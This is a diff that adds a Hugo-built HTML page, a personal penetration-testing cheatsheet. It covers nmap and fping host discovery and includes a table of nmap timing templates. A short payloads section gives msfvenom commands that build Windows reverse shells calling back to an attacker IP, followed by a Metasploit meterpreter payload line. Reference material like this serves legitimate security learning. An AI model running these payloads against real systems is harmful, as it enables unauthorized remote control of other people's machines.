@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>CHEATSHEET :: Terminal</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This is my pentesting cheatsheet.
+RECONNAISSANCE Fping fping differs from ping in that you can specify any number of targets on the command line, or specify a file containing the lists of targets to ping. fping also supports sending a specified number of pings to a target, or looping indefinitely (as in ping ). Unlike ping, fping is meant to be used in scripts, so its output is designed to be easy to parse." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/cheatsheet/" />
+
+
+  
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="//localhost:1313/img/theme-colors/pink.png">
+  <link rel="apple-touch-icon" href="//localhost:1313/img/theme-colors/pink.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="CHEATSHEET">
+<meta property="og:description" content="This is my pentesting cheatsheet.
+RECONNAISSANCE Fping fping differs from ping in that you can specify any number of targets on the command line, or specify a file containing the lists of targets to ping. fping also supports sending a specified number of pings to a target, or looping indefinitely (as in ping ). Unlike ping, fping is meant to be used in scripts, so its output is designed to be easy to parse." />
+<meta property="og:url" content="//localhost:1313/cheatsheet/" />
+<meta property="og:site_name" content="Terminal" />
+
+  
+    <meta property="og:image" content="//localhost:1313/img/favicon/pink.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-05-02 08:23:10 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="pink">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cd $HOME
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/cheatsheet">CheatSheet</a></li>
+        
+      
+        
+          <li><a href="/whoami">Whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/cheatsheet" >CheatSheet</a></li>
+        
+      
+        
+          <li><a href="/whoami" >Whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/cheatsheet/">CHEATSHEET</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-05-02</time></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>This is my <strong>pentesting cheatsheet</strong>.</p>
+<div style="text-align: center;">
+  <img src="../img/hacking-614833260.gif" alt="Image description" style="display: block; margin: 0 auto;" />
+</div>
+<h1 id="reconnaissance">RECONNAISSANCE<a href="#reconnaissance" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="fping">Fping<a href="#fping" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>fping differs from ping in that you can specify any number of targets on the command line, or specify a file containing the lists of targets to ping.
+fping also supports sending a specified number of pings to a target, or looping indefinitely (as in ping ). Unlike ping, fping is meant to be used in scripts, so its output is designed to be easy to parse.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fping 10.4.23.227
+</span></span></code></pre></div><h2 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="ping-sweep">Ping Sweep<a href="#ping-sweep" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn  192.168.56.0/24
+</span></span></code></pre></div><p>Scan mutlipe IP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn  192.168.56.227 10.4.23.228 
+</span></span></code></pre></div><p>Scan range of IP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn 10.4.23.227-240
+</span></span></code></pre></div><p>Scan file with IP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn -iL &lt;filename&gt;
+</span></span></code></pre></div><h3 id="tcp-syn-ping">TCP SYN Ping<a href="#tcp-syn-ping" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn -PS 10.4.23.227
+</span></span></code></pre></div><p>To set range ports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn -PS1-1000 10.4.23.227
+</span></span></code></pre></div><p>To set multple ports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn -PS80,3389,445 10.4.23.227
+</span></span></code></pre></div><p>To perfom <strong>prot scan</strong> with this technique simple remove <strong>-sn</strong> flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -PS80,3389,445 10.4.23.227
+</span></span></code></pre></div><h3 id="tcp-ack-ping-scan">TCP ACK Ping Scan<a href="#tcp-ack-ping-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn -PA 10.4.23.227
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn -PE 10.4.23.227 --send-ip
+</span></span></code></pre></div><h3 id="timing-templates">Timing Templates<a href="#timing-templates" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>This is the table where the <strong>-T0-4</strong> flags are explained</p>
+<table>
+<thead>
+<tr>
+<th>Timing templates and their effects</th>
+<th>T0</th>
+<th>T1</th>
+<th>T2</th>
+<th>T3</th>
+<th>T4</th>
+<th>T5</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Name</strong></td>
+<td>Paranoid</td>
+<td>Sneaky</td>
+<td>Polite</td>
+<td>Normal</td>
+<td>Aggressive</td>
+<td>Insane</td>
+</tr>
+<tr>
+<td><strong>min-rtt-timeout</strong></td>
+<td>100 ms</td>
+<td>100 ms</td>
+<td>100 ms</td>
+<td>100 ms</td>
+<td>100 ms</td>
+<td>50 ms</td>
+</tr>
+<tr>
+<td><strong>max-rtt-timeout</strong></td>
+<td>5 minutes</td>
+<td>15 seconds</td>
+<td>10 seconds</td>
+<td>10 seconds</td>
+<td>1250 ms</td>
+<td>300 ms</td>
+</tr>
+<tr>
+<td><strong>initial-rtt-timeout</strong></td>
+<td>5 minutes</td>
+<td>15 seconds</td>
+<td>1 second</td>
+<td>1 second</td>
+<td>500 ms</td>
+<td>250 ms</td>
+</tr>
+<tr>
+<td><strong>max-retries</strong></td>
+<td>10</td>
+<td>10</td>
+<td>10</td>
+<td>10</td>
+<td>6</td>
+<td>2</td>
+</tr>
+<tr>
+<td><strong>Initial (and minimum) scan delay (&ndash;scan-delay)</strong></td>
+<td>5 minutes</td>
+<td>15 seconds</td>
+<td>400 ms</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td><strong>Maximum TCP scan delay</strong></td>
+<td>5 minutes</td>
+<td>15,000</td>
+<td>1 second</td>
+<td>1 second</td>
+<td>10 ms</td>
+<td>5 ms</td>
+</tr>
+<tr>
+<td><strong>Maximum UDP scan delay</strong></td>
+<td>5 minutes</td>
+<td>15 seconds</td>
+<td>1 second</td>
+<td>1 second</td>
+<td>1 second</td>
+<td>1 second</td>
+</tr>
+<tr>
+<td><strong>host-timeout</strong></td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>15 minutes</td>
+</tr>
+<tr>
+<td><strong>script-timeout</strong></td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>10 minutes</td>
+</tr>
+<tr>
+<td><strong>min-parallelism</strong></td>
+<td>Dynamic, not affected by timing templates</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>max-parallelism</strong></td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>Dynamic</td>
+<td>Dynamic</td>
+<td>Dynamic</td>
+</tr>
+<tr>
+<td><strong>min-hostgroup</strong></td>
+<td>Dynamic, not affected by timing templates</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>max-hostgroup</strong></td>
+<td>Dynamic, not affected by timing templates</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>min-rate</strong></td>
+<td>No minimum rate limit</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>max-rate</strong></td>
+<td>No maximum rate limit</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>defeat-rst-ratelimit</strong></td>
+<td>Not enabled by default</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<hr>
+<h1 id="payloads">Payloads<a href="#payloads" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="msfvenom">Msfvenom<a href="#msfvenom" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="reverse-shell">Reverse Shell<a href="#reverse-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Reverse shell in C format</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.131.154 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9500</span> -f c
+</span></span></code></pre></div><p>Reverse shell in binary format</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.131.154 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f raw -o code.bin
+</span></span></code></pre></div><hr>
+<hr>
+<h1 id="c2-framework">C2 Framework<a href="#c2-framework" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="metasploit">Metasploit<a href="#metasploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>While Metasploit is not a dedicated C2 framework, it can be used in conjunction with C2 capabilities for more advanced penetration testing and red teaming scenarios. Metasploit&rsquo;s <strong>Meterpreter</strong>, for instance, is a powerful payload that allows for interactive control over a compromised system, somewhat akin to C2 operations.</p>
+<p>Use meterpreter for windows reverse shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use payload/windows/x64/meterpreter_reverse_tcp
+</span></span></code></pre></div>
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2024 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
